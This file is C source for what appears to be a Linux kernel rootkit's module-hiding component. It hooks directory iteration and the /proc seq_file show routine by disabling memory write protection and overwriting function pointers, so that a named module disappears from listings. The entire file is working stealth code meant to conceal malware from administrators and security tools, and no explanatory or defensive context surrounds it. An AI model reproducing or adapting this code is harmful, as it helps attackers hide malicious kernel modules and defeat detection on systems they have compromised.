#include "../header/hide.h"

unsigned long * seq_show_addr_mod;

int (*real_iterate_mod)(struct file *filp, struct dir_context *ctx);

int fake_iterate_mod(struct file *filp, struct dir_context *ctx);

int (*real_seq_show_mod)(struct seq_file *seq, void *v);

int fake_seq_show_mod(struct seq_file *seq, void *v);

int (*real_filldir_mod)(struct dir_context *ctx, const char *name, int namlen, loff_t offset, u64 ino, unsigned d_type);

int fake_filldir_mod(struct dir_context *ctx, const char *name, int namlen, loff_t offset, u64 ino, unsigned d_type);


void hook_iterate_mod(void) {                       
    struct file *filp;                                  
    struct file_operations *f_op;                       
                                                        
    printk(KERN_INFO "Opening the path: %s.\n", ROOT_PATH);          
    filp = filp_open(ROOT_PATH, O_RDONLY, 0);                
                            
    f_op = (struct file_operations *)filp->f_op;    
    real_iterate_mod = f_op->iterate_shared;                              
                                                    
    unprotect_memory();                     
    f_op->iterate_shared = fake_iterate_mod;               
    protect_memory();                      
                                
}

void hook_cleanupfile_mod(void) {
    struct file *filp;                                  
    struct file_operations *f_op;                       
                                                        
    printk(KERN_INFO "Opening the path: %s.\n", ROOT_PATH);          
    filp = filp_open(ROOT_PATH, O_RDONLY, 0);                
                            
    f_op = (struct file_operations *)filp->f_op;    
                            
    unprotect_memory();                     
    f_op->iterate_shared = real_iterate_mod;               
    protect_memory();            
}

int fake_iterate_mod(struct file *filp, struct dir_context *ctx) {
    real_filldir_mod = ctx->actor;
    *(filldir_t *)&ctx->actor = fake_filldir_mod;

    return real_iterate_mod(filp, ctx);
}


int fake_filldir_mod(struct dir_context *ctx, const char *name, int namlen, loff_t offset, u64 ino, unsigned d_type) {
    if (strcmp(name, MODULE_NAME) == 0) {
        printk(KERN_INFO "Hiding: %s\n", name);
        return 0;
    }

    return real_filldir_mod(ctx, name, namlen, offset, ino, d_type);
}


void hook_show_mod(void) {
    struct file *filp;
    struct seq_file *test;
    filp = filp_open(PROC_PATH, O_RDONLY, 0);

    test = (struct seq_file*) filp->private_data;
    real_seq_show_mod = test->op->show;

    seq_show_addr_mod = (unsigned long*)&test->op->show;
    unprotect_memory();
    *seq_show_addr_mod = (unsigned long)fake_seq_show_mod;
    protect_memory();
}


void hook_cleanup_mod(void) {
    unprotect_memory();
    *seq_show_addr_mod = (unsigned long)real_seq_show_mod;
    protect_memory();
}

int fake_seq_show_mod(struct seq_file *seq, void *v) {
    int ret;
    size_t last_count, last_size;

    last_count = seq->count;
    
    ret =  real_seq_show_mod(seq, v);
    
    last_size = seq->count - last_count;

    if (strnstr(seq->buf + seq->count - last_size, MODULE_NAME,
                last_size)) {
        printk(KERN_INFO "Hiding module: %s\n", MODULE_NAME);
        seq->count -= last_size;
    }
    return ret;
}

void mod_hide(void) {
    hook_iterate_mod();
    hook_show_mod();
}

void mod_unhide(void) {
    hook_cleanupfile_mod();
    hook_cleanup_mod();
 }
